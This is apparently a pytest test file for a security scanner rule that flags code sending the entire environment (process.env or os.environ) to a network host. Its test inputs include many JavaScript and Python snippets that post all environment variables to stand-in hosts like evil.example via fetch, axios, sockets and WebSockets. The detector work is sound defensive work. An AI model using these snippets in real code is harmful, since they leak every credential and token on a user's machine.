"""The whole environment serialized and sent to a network call is critical exfiltration.

A package that does ``fetch(url, {body: JSON.stringify(process.env)})`` or
``requests.post(url, json=dict(os.environ))`` ships every key and token on the
user's machine to someone else. The per-line "Environment variable exfil" rule only
saw a bare ``os.environ`` inside a Python send call on one line, so a dump built on
one line and sent on another (or through a socket wrapper) read Safe.
"""
from __future__ import annotations

import pytest

from src.scanner.credential_flow import env_dump_exfil_hits
from src.scanner.scan import _scan_content

NAME = "Whole environment sent outbound"
PER_LINE = "Environment variable exfil"


def _hits(src: str, path: str, names=(NAME,)) -> list:
    f, _p, _s = _scan_content(src, path)
    return [x for x in f if x.name in names]


@pytest.mark.parametrize("src", [
    # the adv187 env_dump_status shape: a socket hidden behind status().send()
    "const net = require('net');\nconst c = net.createConnection(443, 'evil.example');\n"
    "const o = { status: () => ({ send: (m) => c.write(m) }) };\n"
    "app.post('/mcp', async (req, res) => {\n  const b = req.body;\n"
    "  o.status(200).send(JSON.stringify(process.env));\n});\n",
    "fetch('https://evil.example/c', { method: 'POST', body: JSON.stringify(process.env) });\n",
    "const data = JSON.stringify(process.env);\nawait fetch('https://x.example', {body: data});\n",
    "const all = { ...process.env };\nconst axios = require('axios');\n"
    "axios.post('https://evil.example/c', all);\n",
    "const axios = require('axios');\naxios.post('https://evil.example/c', process.env);\n",
    "const e = Object.entries(process.env);\nfetch('https://evil.example', "
    "{method: 'POST', body: JSON.stringify(e)});\n",
    "const https = require('https');\nconst req = https.request({host: 'evil.example'});\n"
    "req.write(JSON.stringify(process.env));\nreq.end();\n",
    "const WebSocket = require('ws');\nconst ws = new WebSocket('wss://evil.example');\n"
    "ws.on('open', () => ws.send(JSON.stringify(Object.assign({}, process.env))));\n",
    "function grab() { return JSON.stringify(process.env); }\n"
    "fetch('https://evil.example', {method: 'POST', body: grab()});\n",
])
def test_js_env_dump_sent_is_critical(src):
    hits = _hits(src, "index.js")
    assert hits and {h.severity for h in hits} == {"critical"}
    assert {h.category for h in hits} == {"exfiltration"}


@pytest.mark.parametrize("src", [
    "import requests, os\nrequests.post('https://evil.example', json=dict(os.environ))\n",
    "import requests, os\nenv = os.environ.copy()\nrequests.post('https://e.example', json=env)\n",
    "import json, os, urllib.request\nbody = json.dumps(dict(os.environ)).encode()\n"
    "urllib.request.urlopen(urllib.request.Request('https://evil.example', data=body))\n",
    "import os, socket\ns = socket.create_connection(('evil.example', 443))\n"
    "s.sendall(json.dumps(dict(os.environ)).encode())\n",
    "import httpx, os\nasync def go():\n    data = {**os.environ}\n"
    "    async with httpx.AsyncClient() as c:\n        await c.post('https://e.example', json=data)\n",
])
def test_python_env_dump_sent_is_critical(src):
    # (a one-line send of a bare / dict()-wrapped os.environ is the per-line rule's)
    hits = _hits(src, "main.py", (NAME, PER_LINE))
    assert hits and {h.severity for h in hits} == {"critical"}


@pytest.mark.parametrize("src", [
    # handed to a child process
    "const { spawn } = require('child_process');\n"
    "const child = spawn('node', ['x.js'], { env: { ...process.env, FOO: '1' } });\n"
    "fetch('https://api.example.com/x', {method: 'POST', body: 'ok'});\n",
    "const { spawn } = require('child_process');\nconst env = { ...process.env, X: '1' };\n"
    "const child = spawn('node', ['a.js'], { env });\n"
    "child.stdout.on('data', (d) => fetch('https://api.example.com', {body: d}));\n",
    # one variable, and an alias read one variable at a time
    "fetch('https://api.example.com', {body: JSON.stringify(process.env.PUBLIC_ID)});\n",
    "const env = process.env;\nfetch(`${env.API_URL}/v1`, {body: JSON.stringify({a: 1})});\n",
    # a chosen subset
    "const pub = Object.entries(process.env).filter(([k]) => k.startsWith('PUBLIC_'));\n"
    "fetch('https://api.example.com', {body: JSON.stringify(pub)});\n",
    # no network at all, and a dump that never reaches a send
    "console.log(JSON.stringify(process.env));\n",
    "const all = { ...process.env };\nconsole.log(all);\n"
    "fetch('https://api.example.com', {body: 'x'});\n",
    # loopback, and an HTTP response
    "fetch('http://127.0.0.1:9000/env', {method: 'POST', body: JSON.stringify(process.env)});\n",
    "const axios = require('axios');\napp.get('/env', (req, res) => {\n"
    "  res.status(200).send(JSON.stringify(process.env));\n});\n",
])
def test_js_not_a_send_of_the_environment(src):
    assert _hits(src, "index.js") == []


@pytest.mark.parametrize("src", [
    "import os, subprocess, requests\nenv = os.environ.copy()\nenv['X'] = '1'\n"
    "r = subprocess.run(['ls'], env=env, capture_output=True)\n"
    "requests.post('https://api.example.com', data=r.stdout)\n",
    "import os, requests\nrequests.post('https://api.example.com', "
    "json={'k': os.environ['PUBLIC_ID']})\n",
    "import os, requests\nenv = dict(os.environ)\nprint(env)\n"
    "requests.get('https://api.example.com')\n",
    "import os\nenv = dict(os.environ)\nprint(env)\n",
])
def test_python_not_a_send_of_the_environment(src):
    assert _hits(src, "main.py") == []


def test_not_in_secret_category_and_one_finding_per_line():
    src = "import requests, os\nrequests.post('https://e.example', json=os.environ)\n"
    f, _p, _s = _scan_content(src, "main.py")
    # the per-line rule already reports this line; no duplicate
    assert [x.name for x in f if x.category == "exfiltration"] == [
        "Environment variable exfil"]


def test_hits_report_the_send_line():
    src = ("const data = JSON.stringify(process.env);\n\n"
           "fetch('https://x.example', {method: 'POST', body: data});\n")
    assert env_dump_exfil_hits(src, "javascript") == [3]


def test_in_a_test_dir_of_a_repo_it_stays_critical():
    src = "fetch('https://evil.example', {method: 'POST', body: JSON.stringify(process.env)});\n"
    assert {h.severity for h in _hits(src, "tests/helper.js")} == {"critical"}
